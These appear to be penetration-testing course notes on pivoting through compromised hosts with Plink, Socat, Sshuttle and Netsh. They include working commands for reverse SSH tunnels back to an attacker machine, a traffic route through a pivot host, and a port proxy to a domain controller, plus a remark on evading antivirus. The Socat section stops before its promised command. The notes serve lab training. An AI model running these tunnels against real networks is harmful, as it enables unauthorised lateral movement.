## Plink
Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool, so we will cover it here.

Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:  
`cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N`  

Notice that this syntax is nearly identical to previously when using the standard OpenSSH client. The `cmd.exe /c echo y` at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before.

To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:  
`cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N`

Note that any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with:  
`puttygen KEYFILE -o OUTPUT_KEY.ppk`  
Substituting in a valid file for the keyfile, and adding in the output file.  

The resulting `.ppk` file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).  

_**Note:** Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the_ `.exe`_. Whilst there is a copy pre-installed on Kali at_ `/usr/share/windows-resources/binaries/plink.exe`_, downloading a new copy from [here](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) before a new engagement is sensible.

## Socat
Socat is not just great for fully stable Linux shells[[1]](https://tryhackme.com/room/introtoshells), it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both [Linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat) and [Windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download). Bear in mind that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting: if you have completed the [What the Shell?](https://tryhackme.com/room/introtoshells) room, you will know that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it's well worth experimenting with this in your own time.  

Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:

## Sshuttle
[Sshuttle](https://github.com/sshuttle/sshuttle) is another tool written in Python which removes the need to configure proxychains. However, this tool only works for pivoting over SSH and does not provide other options for pivoting over TOR or HTTPS proxy servers. `Sshuttle` can be extremely useful for automating the execution of iptables and adding pivot rules for the remote host. We can configure the Ubuntu server as a pivot point and route all of Nmap's network traffic with sshuttle using the example later in this section.

One interesting usage of sshuttle is that we don't need to use proxychains to connect to the remote hosts. Let's install sshuttle via our Ubuntu pivot host and configure it to connect to the Windows host via RDP.

```bash
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v 
```

With this command, sshuttle creates an entry in our `iptables` to redirect all traffic to the 172.16.5.0/23 network through the pivot host.

## Netsh
(Requires admin privs)
```powershell
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=$pivot connectport=3389 connectaddress=$dc01

netsh.exe interface portproxy show v4tov4
```
